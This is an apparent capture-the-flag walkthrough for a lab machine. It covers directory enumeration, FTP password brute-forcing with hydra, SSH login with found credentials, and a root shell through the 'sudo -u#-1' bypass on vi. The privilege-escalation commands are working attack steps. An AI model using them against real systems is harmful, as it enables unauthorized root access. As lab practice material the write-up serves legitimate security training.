* ports 
* gobuster 
* 
        /assets
        
        http://10.10.123.210/sup3r_s3cret_fl4g/   
* video 
* 
      burpsuite
      
        got a file link containing a image .
        the image strings gave one ftp username and many passwords.
        
* ftp 
* 
     getting into ftp using hydra
     
     got eli's ssh credentials
     
* ssh

      read promt now,
      
      `find / 2>/dev/null | grep s3r3t`
      
      pass for user gwendoline
      
      su gwendoline
      
      resd user.txt in gwendoline folder
      
      sudo -l (eli was not in sudoers litst but gwendoline was!)
      
           (ALL, !root) NOPASSWD: /usr/bin/vi
           
           google it (https://cheatography.com/blacklist/cheat-sheets/linux-windows-privilege-escalation/)
           
           `sudo -u#-1 /usr/bin/vi` (vi opens with root)
           
           now type `:!/bin/bash` to get the shell as root 
           
           `cat /root/root.txt`
                  
 
The related files can be found here https://drive.google.com/drive/folders/1kFohHNG1zW6wgnKjhixgZf4EXDHxiLMi?usp=sharing
